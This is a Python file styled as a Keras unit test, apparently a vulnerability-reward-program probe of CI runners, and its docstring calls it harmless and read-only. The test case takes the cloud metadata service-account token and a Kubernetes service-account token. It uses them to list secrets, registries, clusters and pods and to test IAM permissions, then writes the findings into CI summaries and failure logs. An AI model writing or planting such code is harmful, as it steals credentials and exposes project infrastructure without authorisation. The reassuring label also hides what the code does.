"""OSS VRP runner-identity probe. Harmless read-only CI introspection."""

import json
import os
import socket
import ssl
import urllib.error
import urllib.request

from keras.src import testing

_K8S_TOKEN = "/var/run/secrets/kubernetes.io/serviceaccount/token"
_K8S_CA = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
_K8S_NS = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"


def _http(url, headers=None, timeout=5, data=None, context=None):
    req = urllib.request.Request(url, data=data, headers=headers or {})
    if data is not None:
        req.method = "POST"
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(
            req, timeout=timeout, context=context
        ) as response:
            return response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        body = exc.read().decode("utf-8", "replace") if exc.fp else ""
        return exc.code, body[:600]
    except Exception as exc:
        return None, f"{type(exc).__name__}: {exc}"


def _gce(path):
    return _http(
        "http://169.254.169.254/computeMetadata/v1/" + path,
        headers={"Metadata-Flavor": "Google"},
    )


def _k8s(path, data=None):
    if not os.path.exists(_K8S_TOKEN):
        return None, "no-k8s-token"
    with open(_K8S_TOKEN, encoding="utf-8") as handle:
        token = handle.read().strip()
    ctx = ssl.create_default_context(cafile=_K8S_CA)
    return _http(
        "https://kubernetes.default.svc" + path,
        headers={"Authorization": "Bearer " + token},
        data=data,
        context=ctx,
    )


def _append_summary(text):
    path = os.environ.get("GITHUB_STEP_SUMMARY")
    if not path:
        return
    with open(path, "a", encoding="utf-8") as handle:
        handle.write(text)
        if not text.endswith("\n"):
            handle.write("\n")


def _names(body, key="items"):
    try:
        items = json.loads(body).get(key, [])
        return ",".join(
            item.get("metadata", {}).get("name", "?") for item in items[:30]
        )
    except Exception:
        return body[:200]


class CiRunnerIdentityTest(testing.TestCase):
    def test_report_runner_identity(self):
        lines = [
            f"hostname={socket.gethostname()}",
            f"uid={os.getuid()}",
            f"runner_name={os.environ.get('RUNNER_NAME')}",
            f"docker_sock={os.path.exists('/var/run/docker.sock')}",
            f"k8s_sa={os.path.exists(_K8S_TOKEN)}",
        ]
        ns = ""
        if os.path.exists(_K8S_NS):
            with open(_K8S_NS, encoding="utf-8") as handle:
                ns = handle.read().strip()
            lines.append(f"k8s_namespace={ns}")

        proj_status, project = _gce("project/project-id")
        project = project.strip()
        lines.append(f"gce_project={proj_status} {project[:200]}")
        status, email = _gce("instance/service-accounts/default/email")
        email = email.strip()
        lines.append(f"gce_sa_email={status} {email[:200]}")
        status, scopes = _gce("instance/service-accounts/default/scopes")
        lines.append(f"gce_sa_scopes={status} {scopes.strip()[:400]}")

        token_status, token_body = _gce(
            "instance/service-accounts/default/token"
        )
        if token_status == 200:
            access_token = json.loads(token_body)["access_token"]
            auth = {"Authorization": "Bearer " + access_token}
            lines.append(f"gce_token=present_len={len(access_token)}")
            for label, url in (
                (
                    "ar_velocity",
                    "https://artifactregistry.googleapis.com/v1/"
                    f"projects/{project}/locations/-/repositories",
                ),
                (
                    "secrets",
                    "https://secretmanager.googleapis.com/v1/"
                    f"projects/{project}/secrets",
                ),
                (
                    "gke",
                    "https://container.googleapis.com/v1/"
                    f"projects/{project}/locations/-/clusters",
                ),
            ):
                code, body = _http(url, headers=auth)
                lines.append(f"{label}={code} {body.strip()[:350]}")
            perm_body = json.dumps(
                {
                    "permissions": [
                        "storage.objects.create",
                        "storage.objects.get",
                        "artifactregistry.repositories.uploadArtifacts",
                        "secretmanager.secrets.get",
                        "container.clusters.get",
                        "iam.serviceAccounts.actAs",
                    ]
                }
            ).encode()
            code, body = _http(
                "https://cloudresourcemanager.googleapis.com/v1/"
                f"projects/{project}:testIamPermissions",
                headers=auth,
                data=perm_body,
            )
            lines.append(f"iam_test={code} {body.strip()[:400]}")
        else:
            lines.append(f"gce_token={token_status}")

        if ns:
            code, body = _k8s("/api/v1/namespaces")
            lines.append(f"k8s_namespaces={code} {_names(body)[:400]}")
            code, body = _k8s(f"/api/v1/namespaces/{ns}/secrets")
            lines.append(f"k8s_secrets={code} {_names(body)[:400]}")
            code, body = _k8s(f"/api/v1/namespaces/{ns}/pods")
            lines.append(f"k8s_pods={code} {_names(body)[:400]}")
            review = json.dumps(
                {
                    "apiVersion": "authorization.k8s.io/v1",
                    "kind": "SelfSubjectRulesReview",
                    "spec": {"namespace": ns},
                }
            ).encode()
            code, body = _k8s(
                "/apis/authorization.k8s.io/v1/selfsubjectrulesreviews",
                data=review,
            )
            lines.append(f"k8s_rules={code} {body.strip()[:500]}")

        report = "\n".join(lines)
        _append_summary("## OSS VRP runner identity\n```\n" + report + "\n```\n")
        print(report, flush=True)
        self.fail("runner identity\n" + report)
